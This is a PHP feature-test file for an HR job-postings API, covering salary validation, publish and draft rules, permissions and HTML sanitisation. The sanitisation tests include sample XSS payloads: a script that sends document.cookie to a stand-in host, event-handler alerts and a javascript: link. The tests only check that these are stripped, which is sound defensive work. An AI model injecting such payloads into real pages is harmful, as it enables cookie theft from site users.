<?php

namespace Tests\Feature\Hr;

use App\Models\Department;
use App\Models\JobPosting;
use App\Models\Position;
use Tests\TestCase;

class JobPostingTest extends TestCase
{
    private function payload(string $departmentId, array $overrides = []): array
    {
        return array_merge([
            'title' => 'Senior React Developer',
            'department_id' => $departmentId,
            'employment_type' => 'full_time',
            'work_mode' => 'on_site',
            'location' => 'Karachi, Pakistan',
            'start_time' => '09:00',
            'end_time' => '18:00',
            'short_description' => 'Build the things.',
        ], $overrides);
    }

    // ── Index ────────────────────────────────────────────

    public function test_index_returns_paginated_postings(): void
    {
        $user = $this->actingAsUser('owner');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        JobPosting::factory()->count(3)->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
        ]);

        $this->getJson('/api/v1/hr/job-postings')
            ->assertOk()
            ->assertJsonCount(3, 'data');
    }

    public function test_index_never_returns_another_organizations_postings(): void
    {
        $other = $this->createOrganization();
        $otherDept = Department::factory()->create(['organization_id' => $other->id]);
        JobPosting::factory()->count(2)->create([
            'organization_id' => $other->id,
            'department_id' => $otherDept->id,
        ]);

        $user = $this->actingAsUser('owner');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);
        JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
        ]);

        $response = $this->getJson('/api/v1/hr/job-postings')->assertOk();

        $this->assertCount(1, $response->json('data'));
    }

    // ── Create ───────────────────────────────────────────

    public function test_store_publishes_the_posting_immediately(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id))
            ->assertCreated();

        $this->assertTrue($response->json('data.is_published'));
    }

    /**
     * is_published is not part of the create payload, so it cannot be used to
     * create a draft — unpublishing goes through the separately-gated endpoint.
     */
    public function test_store_ignores_is_published_in_the_payload(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($dept->id, ['is_published' => false]),
        )->assertCreated();

        $this->assertTrue($response->json('data.is_published'));
    }

    public function test_a_new_posting_appears_on_the_public_feed_right_away(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $org = $user->organization;
        $dept = Department::factory()->create(['organization_id' => $org->id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id))
            ->assertCreated();

        $this->getJson("/api/v1/public/organizations/{$org->slug}/job-postings")
            ->assertOk()
            ->assertJsonCount(1, 'data');
    }

    public function test_store_rejects_a_position_from_another_department(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $deptA = Department::factory()->create(['organization_id' => $user->organization_id]);
        $deptB = Department::factory()->create(['organization_id' => $user->organization_id]);

        $position = Position::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $deptB->id,
        ]);

        $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($deptA->id, ['position_id' => $position->id]),
        )->assertStatus(422)->assertJsonValidationErrors(['position_id']);
    }

    // ── Salary rules ─────────────────────────────────────

    public function test_salary_toggle_on_with_only_min_is_accepted(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'min_salary' => 80000,
        ]))->assertCreated();
    }

    /**
     * The regression that matters: copying `gte:min_salary` from
     * StorePositionRequest rejects this, because gte compares against a null
     * min_salary. "Only max means up to" is a required behaviour.
     */
    public function test_salary_toggle_on_with_only_max_is_accepted(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'max_salary' => 120000,
        ]))->assertCreated();
    }

    public function test_salary_toggle_on_with_neither_is_rejected(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
        ]))->assertStatus(422)->assertJsonValidationErrors(['min_salary']);
    }

    public function test_salary_toggle_off_allows_both_to_be_null(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => false,
        ]))->assertCreated();
    }

    public function test_max_below_min_is_rejected(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'min_salary' => 100000,
            'max_salary' => 50000,
        ]))->assertStatus(422)->assertJsonValidationErrors(['max_salary']);
    }

    /** A range whose ends are equal is a single figure, not a range. */
    public function test_max_equal_to_min_is_rejected(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'min_salary' => 90000,
            'max_salary' => 90000,
        ]))->assertStatus(422)->assertJsonValidationErrors(['max_salary']);
    }

    public function test_zero_salary_is_rejected(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'min_salary' => 0,
        ]))->assertStatus(422)->assertJsonValidationErrors(['min_salary']);
    }

    public function test_negative_salary_is_rejected(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'max_salary' => -5000,
        ]))->assertStatus(422)->assertJsonValidationErrors(['max_salary']);
    }

    /** Any positive amount is valid — not just round or whole numbers. */
    public function test_non_round_and_fractional_salaries_are_accepted(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'min_salary' => 87500,
            'max_salary' => 132499.5,
        ]))->assertCreated();
    }

    /**
     * A partial update that only flips the toggle must see the salary already
     * stored on the posting, not just what was sent in the body.
     */
    public function test_toggling_salary_on_alone_uses_the_stored_salary(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'min_salary' => 90000,
            'send_salary_via_api' => false,
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}", [
            'send_salary_via_api' => true,
        ])->assertOk();
    }

    public function test_toggling_salary_on_with_no_salary_anywhere_is_rejected(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'min_salary' => null,
            'max_salary' => null,
            'send_salary_via_api' => false,
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}", [
            'send_salary_via_api' => true,
        ])->assertStatus(422)->assertJsonValidationErrors(['min_salary']);
    }

    // ── posting_date round-trip ──────────────────────────

    /**
     * posting_date must serialise as YYYY-MM-DD. A plain `date` cast emits an
     * ISO timestamp, which <input type="date"> cannot parse — the field renders
     * blank and the next save nulls the stored date.
     */
    public function test_posting_date_is_returned_as_a_plain_date(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($dept->id, ['posting_date' => '2026-08-15']),
        )->assertCreated();

        $this->assertSame('2026-08-15', $response->json('data.posting_date'));

        $id = $response->json('data.id');
        $this->assertSame(
            '2026-08-15',
            $this->getJson("/api/v1/hr/job-postings/{$id}")->json('data.posting_date'),
        );
    }

    public function test_editing_other_fields_preserves_the_posting_date(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'posting_date' => '2026-08-15',
        ]);

        $this->putJson("/api/v1/hr/job-postings/{$posting->id}", [
            'title' => 'Renamed Role',
            'department_id' => $dept->id,
            'employment_type' => 'contract',
            'work_mode' => 'remote',
            'posting_date' => '2026-08-15',
            'send_salary_via_api' => false,
        ])->assertOk();

        $posting->refresh();
        $this->assertSame('2026-08-15', $posting->posting_date->toDateString());
        $this->assertSame('Renamed Role', $posting->title);
        $this->assertSame('contract', $posting->employment_type);
    }

    public function test_salary_is_returned_as_a_number_not_a_string(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'send_salary_via_api' => true,
            'min_salary' => 200000,
        ]))->assertCreated();

        // The encrypted cast decrypts to a string; the API must not leak that
        // detail, or the edit form rejects its own data on load.
        $this->assertIsNotString($response->json('data.min_salary'));
        $this->assertEqualsWithDelta(200000, $response->json('data.min_salary'), 0.001);
    }

    // ── long_description (rich text) ─────────────────────

    public function test_long_description_keeps_the_formatting_the_editor_produces(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $html = '<h2>About the role</h2><p>We need a <strong>senior</strong> '
            .'engineer with <em>depth</em>.</p><ul><li>Ship code</li><li>Review code</li></ul>';

        $response = $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($dept->id, ['long_description' => $html]),
        )->assertCreated();

        $stored = $response->json('data.long_description');

        foreach (['<h2>', '<strong>', '<em>', '<ul>', '<li>'] as $tag) {
            $this->assertStringContainsString($tag, $stored);
        }
    }

    /** The whole reason this content is sanitised before it reaches the site. */
    public function test_script_tags_are_stripped_from_the_long_description(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'long_description' => '<p>Join us</p><script>fetch("//evil.tld?c="+document.cookie)</script>',
        ]))->assertCreated();

        $stored = $response->json('data.long_description');

        $this->assertStringContainsString('Join us', $stored);
        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('evil.tld', $stored);
    }

    public function test_event_handler_attributes_are_stripped(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'long_description' => '<p onclick="alert(1)" onmouseover="alert(2)">Hover me</p>',
        ]))->assertCreated();

        $stored = $response->json('data.long_description');

        $this->assertStringContainsString('Hover me', $stored);
        $this->assertStringNotContainsString('onclick', $stored);
        $this->assertStringNotContainsString('onmouseover', $stored);
    }

    public function test_javascript_urls_are_stripped_from_links(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'long_description' => '<p><a href="javascript:alert(1)">Apply</a></p>',
        ]))->assertCreated();

        $this->assertStringNotContainsString(
            'javascript:',
            (string) $response->json('data.long_description'),
        );
    }

    public function test_external_links_are_forced_to_be_safe(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'long_description' => '<p><a href="https://example.com">Read more</a></p>',
        ]))->assertCreated();

        $stored = $response->json('data.long_description');

        $this->assertStringContainsString('https://example.com', $stored);
        $this->assertStringContainsString('noopener', $stored);
    }

    public function test_an_emptied_editor_stores_null_rather_than_an_empty_paragraph(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id, [
            'long_description' => '<p></p>',
        ]))->assertCreated();

        $this->assertNull($response->json('data.long_description'));
    }

    // ── posting_date and publish state ───────────────────

    /** Back-dating a posting is legitimate — it means "live since". */
    public function test_a_past_posting_date_is_accepted_and_stays_published(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($dept->id, ['posting_date' => now()->subMonth()->toDateString()]),
        )->assertCreated();

        $this->assertTrue($response->json('data.is_published'));
    }

    public function test_todays_posting_date_stays_published(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($dept->id, ['posting_date' => now()->toDateString()]),
        )->assertCreated();

        $this->assertTrue($response->json('data.is_published'));
    }

    public function test_creating_with_a_future_date_produces_a_draft(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $response = $this->postJson(
            '/api/v1/hr/job-postings',
            $this->payload($dept->id, ['posting_date' => now()->addWeek()->toDateString()]),
        )->assertCreated();

        $this->assertFalse($response->json('data.is_published'));
    }

    /** Editing a live posting to a future date must take it off the site. */
    public function test_editing_to_a_future_date_reverts_the_posting_to_draft(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->published()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}", [
            'posting_date' => now()->addWeek()->toDateString(),
        ])->assertOk()->assertJsonPath('data.is_published', false);

        $this->assertFalse($posting->refresh()->is_published);
    }

    /** Moving the date back does not silently republish. */
    public function test_editing_back_to_a_past_date_does_not_republish(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'is_published' => false,
            'posting_date' => now()->addWeek()->toDateString(),
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}", [
            'posting_date' => now()->subDay()->toDateString(),
        ])->assertOk();

        $this->assertFalse($posting->refresh()->is_published);
    }

    // ── Publish ──────────────────────────────────────────

    public function test_publish_endpoint_toggles_visibility(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}/publish", ['is_published' => true])
            ->assertOk()
            ->assertJsonPath('data.is_published', true);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}/publish", ['is_published' => false])
            ->assertOk()
            ->assertJsonPath('data.is_published', false);
    }

    /**
     * The regression this guards: update() forced future-dated postings back to
     * draft but setPublished() had no date check, so the Publish action marked
     * the posting "Published" while the public feed still filtered it out.
     */
    public function test_a_future_dated_posting_cannot_be_published(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'posting_date' => now()->addWeek()->toDateString(),
            'is_published' => false,
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}/publish", ['is_published' => true])
            ->assertStatus(422)
            ->assertJsonValidationErrors('is_published');

        $this->assertFalse($posting->refresh()->is_published);
    }

    /** The block is on publishing only — a scheduled posting can still be edited to today. */
    public function test_publishing_succeeds_once_the_posting_date_is_moved_to_today(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'posting_date' => now()->addWeek()->toDateString(),
            'is_published' => false,
        ]);

        $this->putJson("/api/v1/hr/job-postings/{$posting->id}", [
            'posting_date' => now()->toDateString(),
        ])->assertOk();

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}/publish", ['is_published' => true])
            ->assertOk()
            ->assertJsonPath('data.is_published', true);
    }

    /**
     * Unpublishing is never blocked: a posting that somehow went live with a
     * future date must still be retractable.
     */
    public function test_a_future_dated_posting_can_still_be_unpublished(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->published()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
            'posting_date' => now()->addWeek()->toDateString(),
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}/publish", ['is_published' => false])
            ->assertOk()
            ->assertJsonPath('data.is_published', false);
    }

    // ── Permissions ──────────────────────────────────────

    public function test_finance_manager_cannot_create_a_posting(): void
    {
        $user = $this->actingAsUser('finance_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->postJson('/api/v1/hr/job-postings', $this->payload($dept->id))
            ->assertForbidden();
    }

    public function test_finance_manager_cannot_publish_a_posting(): void
    {
        $user = $this->actingAsUser('finance_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
        ]);

        $this->patchJson("/api/v1/hr/job-postings/{$posting->id}/publish", ['is_published' => true])
            ->assertForbidden();
    }

    public function test_employee_cannot_list_postings(): void
    {
        $user = $this->actingAsUser('employee');
        Department::factory()->create(['organization_id' => $user->organization_id]);

        $this->getJson('/api/v1/hr/job-postings')->assertForbidden();
    }

    // ── Delete ───────────────────────────────────────────

    public function test_destroy_soft_deletes_the_posting(): void
    {
        $user = $this->actingAsUser('hr_manager');
        $dept = Department::factory()->create(['organization_id' => $user->organization_id]);

        $posting = JobPosting::factory()->create([
            'organization_id' => $user->organization_id,
            'department_id' => $dept->id,
        ]);

        $this->deleteJson("/api/v1/hr/job-postings/{$posting->id}")->assertOk();

        $this->assertSoftDeleted('job_postings', ['id' => $posting->id]);
    }
}
